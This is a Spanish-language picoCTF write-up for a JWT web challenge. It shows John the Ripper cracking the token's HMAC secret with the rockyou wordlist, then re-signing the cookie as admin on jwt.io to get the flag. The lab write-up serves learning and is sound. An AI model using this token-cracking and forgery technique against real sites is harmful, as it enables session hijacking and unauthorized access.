## Objetivo 
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

## Solución
```bash
──(luispuentes㉿kali)-[~]
└─$ nano crack

┌──(luispuentes㉿kali)-[~]
└─$ cat crack
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTHVpc1B1ZW50ZXMifQ.9keFp9mYBCeDoR2U-kyqoYnWZliey7Y-pFHofBpDNgE

┌──(luispuentes㉿kali)-[~]
└─$ ls /usr/share/wordlists
amass      dnsmap.txt     john.lst    nmap.lst        wfuzz
dirb       fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirbuster  fern-wifi      metasploit  sqlmap.txt

┌──(luispuentes㉿kali)-[~]
└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz 
gzip: /usr/share/wordlists/rockyou.txt: Permission denied

┌──(luispuentes㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] password for luispuentes:  

┌──(luispuentes㉿kali)-[~]
└─$ john crack --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-sha256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
No password hashes left to crack (see FAQ)

┌──(luispuentes㉿kali)-[~]
└─$ john --show crack
?:ilovepico

1 password hash cracked, 0 left

```

En esta pagina https://jwt.io/ se modifica el valor de la cookie para que sea admin el usuario utilizando la palabra ilovepico para la encriptacion.

El nuevo valor de la cookie se coloca en jwt y se recarga la pagina y listo, tenemos la contraseña

picoCTF{jawt_was_just_what_you_thought_1ca14548}
## Notas
john crack --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-sha256
con este comando un archivo (crack en este caso) se pone a analizar para crackearlo comparandolo con las posibles contraseñas de rockyou.txt

## Referencias
https://www.json.org/json-es.html
https://jwt.io/
https://github.com/openwall/john